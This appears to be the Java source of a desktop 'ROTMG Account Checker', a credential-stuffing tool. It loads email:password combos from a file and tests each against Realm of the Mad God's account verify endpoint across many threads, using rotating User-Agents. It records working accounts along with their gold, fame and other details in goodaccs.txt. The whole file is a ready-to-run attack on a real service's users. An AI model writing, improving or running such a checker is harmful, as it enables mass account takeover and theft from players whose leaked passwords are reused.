import javax.swing.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import java.io.StringReader;
import org.xml.sax.InputSource;
import java.io.FileReader;
import java.io.IOException;
import java.time.Instant;

public class mainform extends  JFrame{
    static mainform m = new mainform();
    private JPanel panel1;
    private JButton startbtn;
    private JLabel badaccs;
    private JLabel goodaccs;
    private JLabel ccount;

    public static String parseXML(String xml, String elementName) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document doc = builder.parse(new InputSource(new StringReader(xml)));

            NodeList elements = doc.getElementsByTagName(elementName);
            if (elements.getLength() > 0) {
                Node element = elements.item(0);
                return element.getTextContent();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    public void Checker(String email, String password){
        try{
            String url = "https://www.realmofthemadgod.com/account/verify?guid=<EMAIL>&password=<PASSWORD>&clientToken=65d2833b891463ec28bcc5eba844af2dc6af50af&game_net=Unity&play_platform=Unity&game_net_user_id=";
            url = url.replace("<EMAIL>", email);
            url = url.replace("<PASSWORD>", password);
            HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
            con.setRequestMethod("GET");
            con.addRequestProperty("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
            con.addRequestProperty("sec-fetch-dest", "document");
            con.addRequestProperty("sec-fetch-mode", "navigate");
            con.addRequestProperty("sec-fetch-site", "none");
            con.addRequestProperty("sec-fetch-user", "?1");
            con.addRequestProperty("upgrade-insecure-requests", "1");
            con.addRequestProperty("User-Agent", randuseragent.getRandomUserAgent());
            con.setInstanceFollowRedirects(true);
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                if(inputLine.contains("<Error>")) {
                    SwingUtilities.invokeLater(() -> {
                        int badcount = Integer.parseInt(badaccs.getText());
                        badcount++;
                        badaccs.setText(Integer.toString(badcount));
                        badaccs.repaint();
                        badaccs.revalidate();
                    });
                } else {
                    try {
                            File goodaccsFile = new File("goodaccs.txt");
                            if (!goodaccsFile.exists()) {
                                goodaccsFile.createNewFile();
                            }

                            String name = mainform.parseXML(inputLine, "Name");
                            String credits = mainform.parseXML(inputLine, "Credits");
                            String creationdate = mainform.parseXML(inputLine, "CreationTimestamp");
                            Instant cd = Instant.ofEpochSecond(Long.parseLong(creationdate));
                            String charsnum = mainform.parseXML(inputLine, "MaxNumChars");
                            String petyardtype = mainform.parseXML(inputLine, "PetYardType");
                            String ffenergy = mainform.parseXML(inputLine, "ForgeFireEnergy");
                            String ffbps = mainform.parseXML(inputLine, "ForgeFireBlueprints");
                            String totalfame = mainform.parseXML(inputLine, "TotalFame");

                            FileWriter fw = new FileWriter(goodaccsFile, true);
                            BufferedWriter bw = new BufferedWriter(fw);
                            bw.write("____________________________");
                            bw.newLine();
                            bw.write("Name: "+name);
                            bw.newLine();
                            bw.write("Realm Gold: "+credits);
                            bw.newLine();
                            bw.write("Creation date: "+cd);
                            bw.newLine();
                            bw.write("Maximum Number of Characters: "+charsnum);
                            bw.newLine();
                            bw.write("Pet Yard Type: "+petyardtype);
                            bw.newLine();
                            bw.write("Forge Fire Energy: "+ffenergy);
                            bw.newLine();
                            bw.write("Forge Fire Blueprints: "+ffbps);
                            bw.newLine();
                            bw.write("TotalFame: "+totalfame);
                            bw.newLine();
                            bw.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                    }
                    SwingUtilities.invokeLater(() -> {
                        int goodcount = Integer.parseInt(goodaccs.getText());
                        goodcount++;
                        goodaccs.setText(Integer.toString(goodcount));
                        goodaccs.repaint();
                        goodaccs.revalidate();
                    });
                }
            }
            in.close();
        } catch (IOException ex) {
            throw new RuntimeException(ex);
        }
    }
    public mainform() {
        startbtn.addActionListener(e -> {
            goodaccs.setText("0");
            badaccs.setText("0");
            startbtn.setEnabled(false);
            try {
                BufferedReader combosReader = new BufferedReader(new FileReader("combos.txt"));
                String line;
                Thread[] threads = new Thread[1000];
                int i = 0;
                while ((line = combosReader.readLine()) != null) {
                    String[] parts = line.split(":");
                    String email = parts[0];
                    String password = parts[1];
                    threads[i] = new Thread(() -> Checker(email, password));
                    threads[i].start();
                    i++;
                }
                for (Thread thread : threads) {
                    if (thread != null) {
                        thread.join();
                    }
                }
            } catch (IOException | InterruptedException er) {
                er.printStackTrace();
            }
            JOptionPane.showMessageDialog(m, "All combos has been checked", "Success", JOptionPane.INFORMATION_MESSAGE);
            startbtn.setEnabled(true);
        });
    }

    public static void main(String[] args) {
        //checking if combos.txt exist / if not creating one
        File combosFile = new File("combos.txt");
        if (!combosFile.exists()) {
            try {
                combosFile.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        //updating combos count
        int comboscount = 0;
        try {
            BufferedReader reader = new BufferedReader(new FileReader("combos.txt"));
            while (reader.readLine() != null) comboscount++;
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        m.ccount.setText(String.valueOf(comboscount));

        m.setContentPane(m.panel1);
        m.setTitle("yunglean_#4171 ROTMG Account Checker");
        m.setSize(450,200);
        m.setVisible(true);
        m.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }
}
